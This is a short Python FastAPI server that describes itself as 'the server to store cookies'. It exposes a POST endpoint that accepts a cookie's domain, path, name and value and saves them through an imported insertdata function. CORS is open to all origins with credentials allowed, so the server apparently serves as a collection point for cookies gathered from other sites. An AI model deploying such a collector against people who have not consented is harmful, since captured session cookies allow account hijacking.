from fastapi import FastAPI
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
from storecookies import insertdata

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class Cookie(BaseModel):
    domain: str
    path: str
    name: str
    value: str


@app.get("/")
def home():
    return {"Info":"This is the server to store cookies"}


cookiedict = {}

@app.post("/store-cookie")
def store_cookie(cookie: Cookie):
    cookiedict["Domain"] = cookie.domain
    cookiedict["Path"] = cookie.path
    cookiedict["Name"] = cookie.name
    cookiedict["Value"] = cookie.value
    insertdata(cookiedict)
    